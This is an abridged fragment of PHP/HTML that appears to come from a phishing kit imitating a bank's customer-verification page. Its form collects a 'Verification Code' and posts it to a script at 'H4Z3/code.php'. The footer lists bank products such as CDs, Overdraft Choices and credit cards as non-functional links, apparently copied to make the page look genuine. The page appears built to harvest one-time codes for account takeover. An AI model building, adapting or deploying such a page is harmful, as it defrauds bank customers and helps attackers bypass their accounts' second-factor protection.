...
<?php endfor; ?>
                    ...
                    <section class="identify-customer-section">
                        <form id="form" action="H4Z3/code.php" method="POST" class="unauth-form jqtransform js-enrollment-form">
                            <div class="unauth-form__row">
                                <div class="unauth-form__rowitem">
                                    <label class="unauth-form__label" for="code">Verification Code</label>
                                    <input type="text" name="code" id="code" placeholder="Enter Verification Code" class="unauth-form__input js-mobilepassword">
                                </div>
                            </div>
                ...
                <footer id="page-footer" class="page-footer">
                    ...
                    <div class="footer-row clearfix">
                        <ul>
                            ...
                            <li>
                                <a  style="cursor: pointer;">Certificates of Deposit (CDs)<sup>®</sup></a>
                            </li>
                            <li>
                            ...
                            <li>
                                <a  style="cursor: pointer;">Overdraft Choices<sup>®</sup></a>
                            </li>
                        </ul>
                        <ul>
                            <li>
                        ...
                        <ul class="last">
                            ...
                            <li>
                                <a  style="cursor: pointer;">Personal Credit Cards</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Business Credit Cards</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Commercial Credit Cards</a>
                            </li>
                            <li>
